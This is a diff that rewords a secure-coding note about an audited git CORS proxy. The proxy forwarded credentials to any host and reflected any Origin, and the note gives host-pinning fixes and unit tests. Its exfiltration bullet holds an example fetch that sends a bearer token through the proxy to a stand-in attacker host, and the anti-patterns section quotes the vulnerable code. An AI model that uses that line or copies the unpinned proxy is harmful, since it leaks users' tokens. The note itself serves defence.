@@ -16,18 +16,18 @@ order: 5
 updated: 2026-06-11
 ---
 
-A browser cannot talk git smart-HTTP to GitHub directly — GitHub serves no CORS
-headers on those endpoints — so an admin SPA that runs isomorphic-git in a Service
-Worker needs a tiny server-side proxy. The proxy receives
+A browser cannot talk git smart-HTTP to GitHub directly, because GitHub serves no
+CORS headers on those endpoints, so an admin SPA that runs isomorphic-git in a
+Service Worker needs a tiny server-side proxy. The proxy receives
 `/api/cors/github.com/owner/repo/info/refs`, fetches
 `https://github.com/owner/repo/info/refs`, and reflects CORS headers back. Twenty
 lines of Hono. What could go wrong.
 
-On a content-admin SPA (2026-06-11) a security audit answered that precisely. The
-deployed proxy built its target as `https://${path}` from the request path with no
-validation at all, reflected any `Origin` header, and copied **every** inbound header
-to the upstream fetch — `Authorization` and `Cookie` included. Three distinct
-attacks in one endpoint:
+A security audit on a content-admin SPA (2026-06-11) answered that. The deployed
+proxy built its target as `https://${path}` straight from the request path with no
+validation, reflected any `Origin` header, and copied **every** inbound header to
+the upstream fetch, `Authorization` and `Cookie` included. That one endpoint opened
+three separate attacks:
 
 - **Credential exfiltration.** `fetch('https://admin.example/api/cors/attacker.tld/x',
   {headers: {Authorization: 'Bearer ' + token}})` — the worker dutifully delivers the
@@ -38,14 +38,15 @@ attacks in one endpoint:
 - **Cross-site abuse.** With `Access-Control-Allow-Origin` reflected, any website a
   visitor opens can drive the proxy from their browser.
 
-The bitter detail: the standalone Worker this code replaced **had** the host pin and
-an Origin allowlist. The protections were lost when the proxy was ported into the
-main app — nobody re-derived the threat model for "the same code, but mounted at
-/api". A port is a rewrite; rewrites need the same review the original got.
+Here is the part that stings: the standalone Worker this code replaced **had** the
+host pin and the Origin allowlist. Both protections vanished when the proxy was
+ported into the main app, because nobody re-derived the threat model for "the same
+code, but mounted at /api". Treat a port as a rewrite, and give it the review the
+original got.
 
 ## How to apply
 
-Pin all three dimensions, in code, where the fetch happens — not in a comment:
+Pin all three dimensions in code, right where the fetch happens, not in a comment:
 
 ```ts
 // Narrowest pattern that serves the feature: git smart-HTTP only.
@@ -74,10 +75,10 @@ export const corsProxy = async (c: Context): Promise<Response> => {
 }
 ```
 
-The path regex is doing double duty: it pins the **host** (the string must start
-with `github.com/`) and the **path shape** (only the three endpoints isomorphic-git
-actually calls). `Authorization` still flows — that is the proxy's job — but it can
-only ever flow to the pinned host.
+The path regex pulls double duty. It pins the **host** (the string must start with
+`github.com/`) and the **path shape** (only the three endpoints isomorphic-git
+actually calls). `Authorization` still flows, which is the proxy's whole job, but it
+can only ever reach the pinned host.
 
 ## Anti-patterns
 
@@ -92,13 +93,13 @@ out.headers.set('Access-Control-Allow-Origin', c.req.header('Origin') ?? '*')
 const headers = new Headers(c.req.raw.headers)
 ```
 
-Symptom of the first: your worker shows up in someone's SSRF writeup. Symptom of the
-second and third: silence — exfiltration through a permissive proxy produces no
-error on your side, which is what makes the class dangerous.
+The first one announces itself when your worker shows up in someone's SSRF writeup.
+The other two give you nothing: exfiltration through a permissive proxy produces no
+error on your side, and that silence is what makes the whole class so dangerous.
 
 ## Enforcement
 
-Unit tests are cheap and direct here: assert a foreign host returns 403 *and the
-fetch mock was never called*, assert a github path outside smart-HTTP returns 403,
-assert `Cookie` is stripped while `Authorization` survives. Put the allowlist in its
-own module so the tests read as the security spec.
+Unit tests are cheap and direct here. Assert that a foreign host returns 403 *and
+the fetch mock was never called*, that a github path outside smart-HTTP returns 403,
+and that `Cookie` is stripped while `Authorization` survives. Keep the allowlist in
+its own module so the tests read as the security spec.
